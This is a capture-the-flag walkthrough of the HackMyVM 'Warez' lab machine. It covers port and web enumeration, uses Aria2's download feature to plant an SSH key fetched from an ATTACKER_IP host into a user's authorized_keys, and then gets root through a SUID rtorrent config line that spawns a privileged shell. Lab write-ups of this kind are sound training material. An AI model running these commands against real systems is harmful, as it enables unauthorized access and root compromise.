# HackMyVM: Warez - Complete Walkthrough

> **Machine:** Warez
> **Platform:** HackMyVM
> **Operating System:** Debian-based Linux
> **Difficulty:** To be determined
> **Attack Path:** Web Enumeration → Aria2 Misconfiguration → SSH Access → SUID Abuse → Root
> **Target IP:** `192.168.56.145`

---

## 📝 Overview

In this HackMyVM challenge, we will be solving a Debian-based machine named **Warez**.

Unlike some other HackMyVM machines, the target IP address is visible directly on the machine banner.

Our target IP is:

```text
192.168.56.145
```

![Machine Banner](https://github.com/naval0505/HackMyVM/blob/16e0b5f460035feadb19c898899ea1b991801dc5/Warez%20-%20HackMyVM%20Writeup/images/q1.png)

---

# 🔍 Phase 1: Reconnaissance

## Full TCP Port Scan

The first step is to perform a complete port scan against the target.

```bash
nmap -p- --min-rate 5000 -T4 192.168.56.145
```

### Results

```text
Nmap scan report for 192.168.56.145
Host is up, received arp-response (0.000082s latency).

Not shown: 65532 closed tcp ports (reset)

PORT     STATE SERVICE REASON
22/tcp   open  ssh     syn-ack ttl 64
80/tcp   open  http    syn-ack ttl 64
6800/tcp open  unknown syn-ack ttl 64

MAC Address: 08:00:27:00:98:FB (Oracle VirtualBox virtual NIC)
```

We discovered three open TCP ports:

| Port   | Service                        |
| ------ | ------------------------------ |
| `22`   | SSH                            |
| `80`   | HTTP                           |
| `6800` | Unknown / HTTP-related service |

![Full Port Scan](https://github.com/naval0505/HackMyVM/blob/16e0b5f460035feadb19c898899ea1b991801dc5/Warez%20-%20HackMyVM%20Writeup/images/q2.png)

---

## 🔎 Service and Version Detection

Now that we know which ports are open, let's perform a more detailed service and version scan.

```bash
nmap -sC -sV -p 22,80,6800 192.168.56.145
```

### Results

```text
Nmap scan report for 192.168.56.145
Host is up, received arp-response (0.00031s latency).

PORT     STATE SERVICE REASON         VERSION
22/tcp   open  ssh     syn-ack ttl 64 OpenSSH 8.4p1 Debian 5 (protocol 2.0)

80/tcp   open  http    syn-ack ttl 64 nginx 1.18.0
| http-methods:
|_  Supported Methods: GET HEAD
|_http-server-header: nginx/1.18.0
|_http-title: Aria2 WebUI

6800/tcp open  http    syn-ack ttl 64 aria2 downloader JSON-RPC
|_http-title: Site doesn't have a title.
| http-methods:
|_  Supported Methods: OPTIONS

MAC Address: 08:00:27:00:98:FB (Oracle VirtualBox virtual NIC)

Service Info: OS: Linux
```

This gives us several interesting findings:

* **Port 22:** OpenSSH `8.4p1 Debian`
* **Port 80:** Nginx hosting an **Aria2 WebUI**
* **Port 6800:** Aria2 JSON-RPC service

The Aria2 service immediately becomes an interesting attack surface.

![Service and Version Scan](https://github.com/naval0505/HackMyVM/blob/16e0b5f460035feadb19c898899ea1b991801dc5/Warez%20-%20HackMyVM%20Writeup/images/q4.png)

---

# 🌐 Phase 2: Web Enumeration

Since HTTP is running on port `80`, we can inspect the application using a browser and Burp Suite.

Visiting:

```text
http://192.168.56.145
```

reveals an **Aria2 WebUI**.

![Aria2 Web Page](https://github.com/naval0505/HackMyVM/blob/16e0b5f460035feadb19c898899ea1b991801dc5/Warez%20-%20HackMyVM%20Writeup/images/q3.png)

The application allows interaction with the Aria2 download service, so we will continue enumerating the web server.

---

## 📂 Directory and File Enumeration

Next, let's use Feroxbuster to search for hidden files and directories.

```bash
feroxbuster -u http://192.168.56.145 -w /usr/share/seclists/Discovery/Web-Content/common.txt
```

### Results

```text
200      GET     5465l    12678w   110676c http://192.168.56.145/app.css
301      GET        7l       11w      169c http://192.168.56.145/flags => http://192.168.56.145/flags/
200      GET    11867l    50937w   539365c http://192.168.56.145/app.js
200      GET    22520l    82682w   866195c http://192.168.56.145/vendor.js
200      GET     1308l     6139w    81758c http://192.168.56.145/
```

We found an interesting directory:

```text
/flags/
```

We also identified the application's JavaScript and CSS files.

![Feroxbuster Scan](https://github.com/naval0505/HackMyVM/blob/16e0b5f460035feadb19c898899ea1b991801dc5/Warez%20-%20HackMyVM%20Writeup/images/q5.png)

---

## 🤖 Robots.txt Discovery

Using a larger wordlist such as `big.txt`, we can discover an additional interesting file:

```text
http://192.168.56.145/robots.txt
```

Inside `robots.txt`, we find a reference to:

```text
result.txt
```

![robots.txt Discovery](https://github.com/naval0505/HackMyVM/blob/16e0b5f460035feadb19c898899ea1b991801dc5/Warez%20-%20HackMyVM%20Writeup/images/q6.png)

Inspecting the available information gives us process-related output from the Linux system.

From these logs, we discover an important username:

```text
carolina
```

This is a valuable finding because usernames are often useful for SSH access, application exploitation, or further local enumeration.

![Process Logs and Carolina User](https://github.com/naval0505/HackMyVM/blob/16e0b5f460035feadb19c898899ea1b991801dc5/Warez%20-%20HackMyVM%20Writeup/images/q7.png)

---

# 🎯 Phase 3: Aria2 WebUI Exploitation

Continuing our investigation of the Aria2 WebUI, we can see that the application allows us to **add downloads using a URI**.

This functionality is especially interesting because Aria2 allows us to control both:

* The URI to download
* The destination directory

We test the download functionality and receive a successful response.

![Aria2 Download Response](https://github.com/naval0505/HackMyVM/blob/16e0b5f460035feadb19c898899ea1b991801dc5/Warez%20-%20HackMyVM%20Writeup/images/q8.png)

This means we may be able to abuse the service to place files in sensitive locations on the target.

Since we already discovered the username `carolina`, a possible target is:

```text
/home/carolina/.ssh/
```

If we can place an SSH public key inside:

```text
/home/carolina/.ssh/authorized_keys
```

we may be able to authenticate as `carolina`.

---

## 🔑 Generating an SSH Key Pair

Let's generate a new SSH key pair on the attacker machine.

```bash
ssh-keygen -t rsa -N "" -f id_rsa_warez
```

### Output

```text
Generating public/private rsa key pair.

Your identification has been saved in id_rsa_warez
Your public key has been saved in id_rsa_warez.pub
```

Checking the generated files:

```bash
ls -lah
```

```text
-rw------- 1 root root 2.6K id_rsa_warez
-rw-r--r-- 1 root root  563 id_rsa_warez.pub
```

Now, let's copy the public key into a file named `authorized_keys`:

```bash
cp id_rsa_warez.pub authorized_keys
```

![SSH Key Creation](https://github.com/naval0505/HackMyVM/blob/16e0b5f460035feadb19c898899ea1b991801dc5/Warez%20-%20HackMyVM%20Writeup/images/q9.png)

---

## 📥 Uploading the SSH Public Key

Next, we host the `authorized_keys` file from our attacker machine using an HTTP server.

For example:

```bash
python3 -m http.server 8080
```

The Aria2 **Add Downloads By URIs** dialog is then configured with the following values:

```text
URI:
http://ATTACKER_IP:8080/authorized_keys

Download Directory:
 /home/carolina/.ssh
```

The important part of this attack is the destination directory:

```text
/home/carolina/.ssh
```

Aria2 downloads our public SSH key into Carolina's `.ssh` directory, resulting in the creation or replacement of:

```text
/home/carolina/.ssh/authorized_keys
```

Once the download completes successfully, we can attempt SSH authentication using our private key.

---

# 🔓 Phase 4: Initial Access

Now let's connect to the target as `carolina` using the private key we generated.

```bash
ssh -i id_rsa_warez carolina@192.168.56.145
```

Successful access gives us a shell as:

```text
carolina
```

![SSH Access as Carolina](https://github.com/naval0505/HackMyVM/blob/16e0b5f460035feadb19c898899ea1b991801dc5/Warez%20-%20HackMyVM%20Writeup/images/q10.png)

Let's check the contents of the user's home directory:

```bash
ls
```

### Output

```text
authorized_keys
index.2.html
index.html
index.1.html
index.3.html
user.txt
```

At this point, we have successfully gained our initial foothold on the target.

---

# 👑 Phase 5: Privilege Escalation

## Enumeration with LinPEAS and pspy

Now that we have shell access as `carolina`, it is time to begin local privilege escalation enumeration.

We transfer enumeration tools such as:

* `linpeas`
* `pspy64`

to the target and begin checking for:

* SUID/SGID binaries
* Scheduled tasks
* Running processes
* Writable files
* Kernel vulnerabilities
* Misconfigured services
* Interesting capabilities

![LinPEAS Enumeration](https://github.com/naval0505/HackMyVM/blob/16e0b5f460035feadb19c898899ea1b991801dc5/Warez%20-%20HackMyVM%20Writeup/images/q11.png)

LinPEAS identified several possible kernel vulnerabilities:

```text
CVE-2021-3490
CVE-2021-3493
CVE-2021-22555
CVE-2022-0847
CVE-2022-32250
CVE-2022-0995
```

---

## 🧪 Attempting Kernel Exploitation

One of the first approaches was attempting a recent Linux privilege escalation vulnerability, commonly referred to as the **Copy Fail** vulnerability.

However, the available proof-of-concept was not compatible with the Python version available on the attacking environment.

### Error 1: Python Type Syntax

```text
str | None
```

The PoC contained syntax requiring Python `3.10+`:

```python
def find_su() -> str | None:
```

However, Python `3.9` does not support this syntax.

It could be modified to:

```python
def find_su():
```

or:

```python
from typing import Optional

def find_su() -> Optional[str]:
```

### Error 2: Missing `os.splice`

Another issue was:

```text
AttributeError: module 'os' has no attribute 'splice'
```

The PoC required:

```python
os.splice()
```

but this function is not available in Python `3.9.2`.

A quick check confirms this:

```bash
python3 -c 'import os; print(hasattr(os, "splice"))'
```

Therefore, instead of continuing to force an incompatible exploit, we moved back to manual enumeration.

![Copy Fail Exploit Failure](https://github.com/naval0505/HackMyVM/blob/16e0b5f460035feadb19c898899ea1b991801dc5/Warez%20-%20HackMyVM%20Writeup/images/q12.png)

> **Lesson:** Never rely entirely on automated kernel exploit suggestions. A vulnerability may be present according to version detection but still be patched, unavailable, unstable, or incompatible with the exploit environment.

---

# 🔎 SUID Enumeration

Before attempting additional kernel vulnerabilities, we inspect SUID and SGID binaries.

A particularly interesting binary appears:

```text
-rwsr-sr-x 1 root root 2.0M Dec 29  2019 /usr/bin/rtorrent
```

The permissions show:

```text
-rwsr-sr-x
```

This means the binary has both:

* **SUID**
* **SGID**

permissions enabled.

Most importantly, the binary is owned by:

```text
root
```

![rtorrent SUID Binary](https://github.com/naval0505/HackMyVM/blob/16e0b5f460035feadb19c898899ea1b991801dc5/Warez%20-%20HackMyVM%20Writeup/images/q13.png)

This makes `/usr/bin/rtorrent` a strong privilege escalation candidate.

---

# 🚀 Exploiting SUID rtorrent

Researching `rtorrent` shows that it can execute commands through its configuration file.

We can create an `.rtorrent.rc` configuration file inside Carolina's home directory containing a command that launches a privileged shell.

```bash
echo 'execute = /bin/bash,-p,-c,"/bin/sh -p </dev/tty >/dev/tty 2>/dev/tty"' > ~/.rtorrent.rc
```

Then execute:

```bash
rtorrent
```

Because the binary runs with elevated SUID privileges, the configured command executes with effective root permissions.

On the target:

```text
carolina@warez:~$ echo 'execute = /bin/bash,-p,-c,"/bin/sh -p </dev/tty >/dev/tty 2>/dev/tty"' > ~/.rtorrent.rc

carolina@warez:~$ rtorrent
```

We now receive a privileged shell.

Let's verify our privileges:

```bash
id
```

### Output

```text
uid=1000(carolina) gid=1000(carolina)
euid=0(root) egid=0(root)
groups=0(root),24(cdrom),25(floppy),29(audio),46(plugdev),109(netdev),1000(carolina)
```

The important values are:

```text
euid=0(root)
egid=0(root)
```

We have successfully become **root**.

![Root Shell](https://github.com/naval0505/HackMyVM/blob/16e0b5f460035feadb19c898899ea1b991801dc5/Warez%20-%20HackMyVM%20Writeup/images/q14.png)

---

# 🏁 Capturing the Root Flag

Finally, we can read the root flag:

```bash
cat /root/root.txt
```

```text
[ROOT FLAG]
```

🎉 **Machine successfully compromised!**

---

# 🗺️ Attack Path Summary

```text
Target Discovery
      │
      ▼
Full Nmap Port Scan
      │
      ├── 22/tcp  → SSH
      ├── 80/tcp  → Aria2 WebUI
      └── 6800/tcp → Aria2 JSON-RPC
      │
      ▼
Web Enumeration
      │
      ├── Feroxbuster
      └── robots.txt
              │
              ▼
      Discover Username: carolina
              │
              ▼
Aria2 Download Functionality
              │
              ▼
Upload SSH Public Key
              │
              ▼
/home/carolina/.ssh/authorized_keys
              │
              ▼
SSH Access as carolina
              │
              ▼
Local Enumeration
              │
              ├── LinPEAS
              ├── pspy
              └── SUID Enumeration
                      │
                      ▼
            /usr/bin/rtorrent (SUID root)
                      │
                      ▼
           Malicious ~/.rtorrent.rc
                      │
                      ▼
                Root Shell
                      │
                      ▼
              Read /root/root.txt
```

---

# 📚 Key Takeaways

## 1. Always Perform Full Port Scans

A default scan could easily miss services running on unusual ports such as:

```text
6800/tcp
```

The Aria2 JSON-RPC service provided important context about the target.

## 2. Enumerate the Web Server Thoroughly

Directory enumeration and files such as:

```text
robots.txt
```

can reveal valuable information.

In this case, further investigation helped identify the username:

```text
carolina
```

## 3. Misconfigured Download Services Can Lead to File Write Attacks

Aria2 allowed downloading a remote file into a user-controlled destination.

This made it possible to place an SSH public key inside:

```text
/home/carolina/.ssh/authorized_keys
```

resulting in initial access.

## 4. Don't Blindly Trust Kernel Exploit Suggestions

LinPEAS can identify potential vulnerabilities based on kernel versions, but a listed CVE does not guarantee successful exploitation.

Always verify:

* Whether the system is actually vulnerable
* Whether patches have been backported
* Exploit prerequisites
* Architecture compatibility
* Kernel configuration
* Required dependencies

## 5. SUID Enumeration Is Extremely Important

Even after several possible kernel exploits appeared, the easiest path to root was a misconfigured SUID binary:

```text
/usr/bin/rtorrent
```

Manual enumeration found a much simpler and more reliable privilege escalation path.

---

# 🛠️ Commands Used

```bash
# Full port scan
nmap -p- --min-rate 5000 -T4 192.168.56.145

# Service and version detection
nmap -sC -sV -p 22,80,6800 192.168.56.145

# Directory enumeration
feroxbuster -u http://192.168.56.145 -w /usr/share/seclists/Discovery/Web-Content/common.txt

# Generate SSH key
ssh-keygen -t rsa -N "" -f id_rsa_warez

# Create authorized_keys file
cp id_rsa_warez.pub authorized_keys

# Host the SSH public key
python3 -m http.server 8080

# Connect using SSH key
ssh -i id_rsa_warez carolina@192.168.56.145

# Verify Python functionality
python3 -c 'import os; print(hasattr(os, "splice"))'

# Privilege escalation through rtorrent
echo 'execute = /bin/bash,-p,-c,"/bin/sh -p </dev/tty >/dev/tty 2>/dev/tty"' > ~/.rtorrent.rc

rtorrent

# Verify root privileges
id

# Read root flag
cat /root/root.txt
```

---

## 🎯 Final Status

| Objective                        | Status |
| -------------------------------- | ------ |
| Target Discovered                | ✅      |
| Full Port Scan Completed         | ✅      |
| Web Service Enumerated           | ✅      |
| Username Discovered              | ✅      |
| Initial Access Obtained          | ✅      |
| SSH Access as Carolina           | ✅      |
| Local Enumeration Completed      | ✅      |
| SUID Misconfiguration Identified | ✅      |
| Root Access Obtained             | ✅      |
| Root Flag Captured               | ✅      |

# ✅ Pwned!

> **Initial Access:** Aria2 arbitrary file download/write behavior → SSH `authorized_keys` placement
> **Privilege Escalation:** SUID `rtorrent` configuration abuse
> **Final Privilege:** `root`

---
